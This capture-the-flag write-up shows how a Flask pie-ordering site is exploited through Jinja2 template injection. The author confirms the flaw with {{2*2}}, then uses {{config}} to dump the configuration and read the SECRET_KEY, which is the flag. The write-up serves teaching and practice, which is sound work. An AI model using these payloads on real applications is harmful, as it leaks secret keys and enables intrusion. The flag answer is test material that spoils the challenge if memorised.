# HackDalton: Get a Py 1 (Writeup)

> Warning! There are spoilers ahead

Upon loading the website, you can register for an account. Once you register for an account and log in, you are sent to a page with a field to order a pie, and text that displays your last order. 

The field explains that html formatting can be used, which immediatly raises a red flag about how text is being displayed. We also see that the website was built with Flask, which uses the Jinja2 templating library.

We can submit an order for a pie with the instructions `{{2*2}}`, and we can see that our last order field updates to say `4`. That means that the template `{{2*2}}` was parsed by Jinja2.

We can then attempt to look at the site's config by typing `{{config}}` into the box. We are then presented with the site's python configuration object:

```python
<Config {'ENV': 'development', 'DEBUG': True, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'hackDalton{my_sup3r_s3cr3t_fl4sk_k3y_WfnZucc9MR}', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
```
We can then see that the site's `SECRET_KEY` is the flag: `hackDalton{my_sup3r_s3cr3t_fl4sk_k3y_WfnZucc9MR}`.